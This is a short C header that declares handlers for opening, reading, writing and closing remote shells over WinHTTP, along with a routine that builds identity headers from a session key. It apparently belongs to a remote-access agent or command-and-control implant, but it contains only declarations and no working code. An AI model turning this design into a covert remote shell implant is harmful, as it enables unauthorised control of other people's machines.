#pragma once

#include "types.h"
#include "transport.h"
#include "protocol.h"
#include "wire.h"
#include "memory.h"
#include "logger.h"
#include "shell.h"

#define IDENTITY_HEADERS_SIZE  900

typedef struct {
    shell_slot *shells;
    const WINHTTP_API *winhttp;
} Context;

typedef VOID (*CommandHandler)(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);

VOID Handle_ReadShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_WriteShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_OpenShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_CloseShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
USIZE Handle_IdentityHeadersCommand(CHAR headers[IDENTITY_HEADERS_SIZE], const CHAR *sessionKey);
